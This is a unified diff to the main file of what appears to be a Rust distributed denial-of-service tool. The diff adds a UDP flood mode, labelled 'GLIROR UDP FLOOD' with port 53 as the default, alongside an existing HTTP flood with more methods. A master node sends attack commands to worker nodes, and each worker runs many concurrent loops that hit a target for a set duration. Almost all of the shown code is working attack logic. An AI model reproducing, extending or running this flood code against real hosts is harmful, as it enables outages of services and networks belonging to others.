@@ -4,12 +4,14 @@ mod display;
 mod stats;
 mod utils;
 mod cluster;
+mod udp;
 
 use clap::Parser;
 use cli::Args;
 use colored::Colorize;
 use display::print_cyan_ascii;
 use http::perform_attack;
+use udp::perform_udp_attack;
 use cli::parse_headers;
 use cluster::{ClusterCoordinator, ClusterConfig, WorkerState, WorkerStatus, WorkerProgress};
 
@@ -62,30 +64,77 @@ async fn main() {
 }
 
 async fn handle_standalone_attack(args: Args) {
-    let target_url = if let Some(url) = args.url {
-        url
+    if args.attack_type == "udp" {
+        // Handle UDP attack
+        let target_host = if let Some(host) = args.host {
+            host
+        } else if let Some(ref url) = args.url {
+            // Extract host from URL if provided
+            url.replace("http://", "").replace("https://", "").split(':').next().unwrap_or(url).to_string()
+        } else if let Some(ref host) = args.host {
+            // Use provided host if available
+            host.clone()
+        } else {
+            utils::prompt_for_host()
+        };
+        
+        let target_port = if let Some(port) = args.target_port {
+            port
+        } else if let Some(ref url) = args.url {
+            // Extract port from URL if provided
+            let cleaned_url = url.replace("http://", "").replace("https://", "");
+            let parts: Vec<&str> = cleaned_url.split(':').collect();
+            if parts.len() > 1 {
+                parts[1].parse().unwrap_or(53) // Default to port 53 for DNS if parsing fails
+            } else {
+                utils::prompt_for_port()
+            }
+        } else {
+            utils::prompt_for_port()
+        };
+        
+        let duration = if args.time != 0 {
+            args.time
+        } else {
+            utils::prompt_for_time()
+        };
+        
+        println!("\n{} Starting UDP attack on: {}:{} with payload: {}", 
+                 "INFO".blue(), target_host, target_port, 
+                 args.data.as_ref().unwrap_or(&"GLIROR UDP FLOOD".to_string()));
+        
+        // Perform UDP attack
+        match perform_udp_attack(target_host, target_port, duration, args.concurrent, args.delay, args.data) {
+            Ok(()) => println!("{} UDP attack completed successfully", "INFO".blue()),
+            Err(e) => eprintln!("{} UDP attack failed: {}", "ERROR".red(), e),
+        }
     } else {
-        utils::prompt_for_url()
-    };
-    
-    let duration = if args.time != 0 {
-        args.time
-    } else {
-        utils::prompt_for_time()
-    };
-    
-    let headers = parse_headers(&args.header);
-    
-    println!("\n{} Starting attack on: {}", "INFO".blue(), target_url);
-    println!("{} Method: {}", "INFO".blue(), args.method);
-    println!("{} Duration: {} seconds", "INFO".blue(), if duration == 0 { "Unlimited".to_string() } else { duration.to_string() });
-    println!("{} Concurrent requests: {}", "INFO".blue(), 
-             args.concurrent.unwrap_or(if duration == 0 { 100 } else { 20 }));
-    if let Some(ref proxy) = args.proxy {
-        println!("{} Proxy: {}", "INFO".blue(), proxy);
+        // Handle HTTP attack (original functionality)
+        let target_url = if let Some(url) = args.url {
+            url
+        } else {
+            utils::prompt_for_url()
+        };
+        
+        let duration = if args.time != 0 {
+            args.time
+        } else {
+            utils::prompt_for_time()
+        };
+        
+        let headers = parse_headers(&args.header);
+        
+        println!("\n{} Starting attack on: {}", "INFO".blue(), target_url);
+        println!("{} Method: {}", "INFO".blue(), args.method);
+        println!("{} Duration: {} seconds", "INFO".blue(), if duration == 0 { "Unlimited".to_string() } else { duration.to_string() });
+        println!("{} Concurrent requests: {}", "INFO".blue(), 
+                 args.concurrent.unwrap_or(if duration == 0 { 100 } else { 20 }));
+        if let Some(ref proxy) = args.proxy {
+            println!("{} Proxy: {}", "INFO".blue(), proxy);
+        }
+        
+        perform_attack(target_url, duration, args.method, headers, args.data, args.proxy, args.concurrent, args.delay, args.output, args.ramp_up, args.schedule).await;
     }
-    
-    perform_attack(target_url, duration, args.method, headers, args.data, args.proxy, args.concurrent, args.delay, args.output, args.ramp_up, args.schedule).await;
 }
 
 use cluster::server::run_master_server;
@@ -109,16 +158,16 @@ async fn run_master_node(args: Args) {
 
     let coordinator = Arc::new(ClusterCoordinator::new(config));
 
-    // Determine port to use
-    let port = args.port.unwrap_or(8080);
+    // Determine port to use for master server
+    let master_port = args.port.unwrap_or(8080);
 
     // Run server in a separate thread  
     let server_coordinator = coordinator.clone();
     tokio::spawn(async move {
-        run_master_server(server_coordinator, port).await;
+        run_master_server(server_coordinator, master_port).await;
     });
 
-    println!("{} Master server started. Listening on http://127.0.0.1:{}", "INFO".blue(), port);
+    println!("{} Master server started. Listening on http://127.0.0.1:{}", "INFO".blue(), master_port);
 
     // Wait for all workers to connect
     let total_workers = coordinator.config.total_workers;
@@ -155,6 +204,9 @@ async fn run_master_node(args: Args) {
 
     let attack_command = cluster::AttackCommand {
         url: target_url,
+        host: args.host.clone(),
+        target_port: args.target_port,
+        attack_type: args.attack_type.clone(),
         time: duration,
         method: args.method.clone(),
         header: args.header.clone(),
@@ -372,53 +424,112 @@ async fn run_worker_node(args: Args) {
                         // Attacker Tasks
                         let mut tasks = Vec::new();
                         let attack_start_time = std::time::Instant::now();
-                        for _ in 0..task.concurrent.unwrap_or(10) {
-                            let client_clone = client.clone();
-                            let url_clone = task.url.clone();
-                            let method_clone = task.method.clone();
-                            let headers = parse_headers(&task.header);
-                            let data_clone = task.data.clone();
-                            let sent_clone = requests_sent.clone();
-                            let success_clone = requests_success.clone();
-                            let error_clone = requests_error.clone();
-                            let response_times_clone = avg_response_time_values.clone();
-                            
-                            let task_handle = tokio::spawn(async move {
-                                loop {
-                                    if task.time > 0 && attack_start_time.elapsed().as_secs() >= task.time {
-                                        break;
-                                    }
-                                    let request_start = std::time::Instant::now();
-                                    let mut request_builder = match method_clone.as_str() {
-                                        "GET" => client_clone.get(&url_clone),
-                                        "POST" => client_clone.post(&url_clone),
-                                        _ => client_clone.get(&url_clone),
-                                    };
-                                    for (key, value) in &headers {
-                                        request_builder = request_builder.header(key, value);
-                                    }
-                                    if let Some(ref payload) = data_clone {
-                                        request_builder = request_builder.body(payload.clone());
-                                    }
-                                    
-                                    match request_builder.send().await {
-                                        Ok(_) => {
-                                            let elapsed = request_start.elapsed().as_millis() as f64;
-                                            success_clone.fetch_add(1, Ordering::SeqCst);
-                                            response_times_clone.lock().unwrap().push(elapsed);
-                                        }
-                                        Err(_) => {
-                                            error_clone.fetch_add(1, Ordering::SeqCst);
-                                        }
-                                    }
-                                    sent_clone.fetch_add(1, Ordering::SeqCst);
-                                    
-                                    if task.delay > 0 {
-                                        tokio::time::sleep(Duration::from_millis(task.delay)).await;
-                                    }
+                        
+                        if task.attack_type == "udp" {
+                            // UDP attack implementation for worker
+                            let target_host = task.host.clone().unwrap_or_else(|| {
+                                let cleaned_url = task.url.replace("http://", "").replace("https://", "");
+                                cleaned_url.split(':').next().unwrap_or(&task.url).to_string()
+                            });
+                            let target_port = task.target_port.unwrap_or_else(|| {
+                                let cleaned_url = task.url.replace("http://", "").replace("https://", "");
+                                let parts: Vec<&str> = cleaned_url.split(':').collect();
+                                if parts.len() > 1 {
+                                    parts[1].parse().unwrap_or(53)
+                                } else {
+                                    53
                                 }
                             });
-                            tasks.push(task_handle);
+                            let payload = task.data.clone();
+                            
+                            for _ in 0..task.concurrent.unwrap_or(10) {
+                                let target_host_clone = target_host.clone();
+                                let target_port_clone = target_port;
+                                let payload_clone = payload.clone();
+                                let sent_clone = requests_sent.clone();
+                                let success_clone = requests_success.clone();
+                                let error_clone = requests_error.clone();
+                                let attack_start_time_clone = attack_start_time.clone();
+                                let time_clone = task.time;
+                                let delay_clone = task.delay;
+                                
+                                let task_handle = tokio::spawn(async move {
+                                    loop {
+                                        if time_clone > 0 && attack_start_time_clone.elapsed().as_secs() >= time_clone {
+                                            break;
+                                        }
+                                        
+                                        match udp_attack_single_request(&target_host_clone, target_port_clone, &payload_clone) {
+                                            Ok(_) => {
+                                                success_clone.fetch_add(1, Ordering::SeqCst);
+                                            }
+                                            Err(_) => {
+                                                error_clone.fetch_add(1, Ordering::SeqCst);
+                                            }
+                                        }
+                                        sent_clone.fetch_add(1, Ordering::SeqCst);
+                                        
+                                        if delay_clone > 0 {
+                                            tokio::time::sleep(Duration::from_millis(delay_clone)).await;
+                                        }
+                                    }
+                                });
+                                tasks.push(task_handle);
+                            }
+                        } else {
+                            // HTTP attack implementation for worker (original)
+                            for _ in 0..task.concurrent.unwrap_or(10) {
+                                let client_clone = client.clone();
+                                let url_clone = task.url.clone();
+                                let method_clone = task.method.clone();
+                                let headers = parse_headers(&task.header);
+                                let data_clone = task.data.clone();
+                                let sent_clone = requests_sent.clone();
+                                let success_clone = requests_success.clone();
+                                let error_clone = requests_error.clone();
+                                let response_times_clone = avg_response_time_values.clone();
+                                
+                                let task_handle = tokio::spawn(async move {
+                                    loop {
+                                        if task.time > 0 && attack_start_time.elapsed().as_secs() >= task.time {
+                                            break;
+                                        }
+                                        let request_start = std::time::Instant::now();
+                                        let mut request_builder = match method_clone.as_str() {
+                                            "GET" => client_clone.get(&url_clone),
+                                            "POST" => client_clone.post(&url_clone),
+                                            "PUT" => client_clone.put(&url_clone),
+                                            "DELETE" => client_clone.delete(&url_clone),
+                                            "PATCH" => client_clone.patch(&url_clone),
+                                            "HEAD" => client_clone.head(&url_clone),
+                                            _ => client_clone.get(&url_clone),
+                                        };
+                                        for (key, value) in &headers {
+                                            request_builder = request_builder.header(key, value);
+                                        }
+                                        if let Some(ref payload) = data_clone {
+                                            request_builder = request_builder.body(payload.clone());
+                                        }
+                                        
+                                        match request_builder.send().await {
+                                            Ok(_) => {
+                                                let elapsed = request_start.elapsed().as_millis() as f64;
+                                                success_clone.fetch_add(1, Ordering::SeqCst);
+                                                response_times_clone.lock().unwrap().push(elapsed);
+                                            }
+                                            Err(_) => {
+                                                error_clone.fetch_add(1, Ordering::SeqCst);
+                                            }
+                                        }
+                                        sent_clone.fetch_add(1, Ordering::SeqCst);
+                                        
+                                        if task.delay > 0 {
+                                            tokio::time::sleep(Duration::from_millis(task.delay)).await;
+                                        }
+                                    }
+                                });
+                                tasks.push(task_handle);
+                            }
                         }
                         
                         // Wait for all tasks to complete
@@ -490,4 +601,18 @@ async fn run_worker_node(args: Args) {
             }
         }
     }
+}
+
+fn udp_attack_single_request(target_host: &str, target_port: u16, payload: &Option<String>) -> Result<(), Box<dyn std::error::Error>> {
+    use std::net::UdpSocket;
+    
+    let target_addr = format!("{}:{}", target_host, target_port);
+    let default_payload = "GLIROR UDP FLOOD".to_string();
+    let payload_bytes = payload.as_ref().unwrap_or(&default_payload).as_bytes();
+    
+    let socket = UdpSocket::bind("0.0.0.0:0")?;
+    socket.set_write_timeout(Some(std::time::Duration::from_millis(100)))?;
+    socket.send_to(payload_bytes, &target_addr)?;
+    
+    Ok(())
 }
